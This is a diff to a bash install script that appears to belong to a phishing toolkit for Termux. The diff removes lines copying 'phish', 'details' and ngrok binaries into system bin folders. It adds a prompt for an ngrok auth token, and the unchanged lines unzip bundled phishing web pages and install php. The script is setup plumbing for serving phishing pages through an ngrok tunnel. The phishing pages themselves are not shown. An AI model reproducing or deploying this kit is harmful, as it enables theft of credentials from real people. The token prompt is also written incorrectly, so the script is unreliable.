@@ -1,20 +1,5 @@
 #! /bin/bash
-echo "removing all old phishing files"
-sleep 10
-cp -r details /bin /dev/null 2>&1  &
-cp -r phish /bin /dev/null 2>&1  &
-cp -r ngrok /bin /dev/null 2>&1  &
-chmod 775 /bin/phish /dev/null 2>&1  &
-chmod 775 /bin/details /dev/null 2>&1  &
-chmod 775 /bin/ngrok /dev/null 2>&1  &
-cp -r details /data/data/com.termux/files/usr/bin /dev/null 2>&1  &
-cp -r phish /data/data/com.termux/files/usr/bin /dev/null 2>&1  &
-cp -r ngrok /data/data/com.termux/files/usr/bin /dev/null 2>&1  &
-chmod 775 /data/data/com.termux/files/usr/bin/phish /dev/null 2>&1  &
-chmod 775 /data/data/com.termux/files/usr/bin/details /dev/null 2>&1  &
-chmod 775 /data/data/com.termux/files/usr/bin/ngrok /dev/null 2>&1  &
-echo "installing files" 
-sleep 10
+
 mkdir WebPages
 unzip WebPages1.zip
 unzip WebPages2.zip
@@ -38,4 +23,5 @@ apt-get install php -y
 
 
 
-echo "run tool by writing -- phish"
+read -p " NGROK_AUTH:       " $TOKEN
+./ngrok authtoken $TOKEN
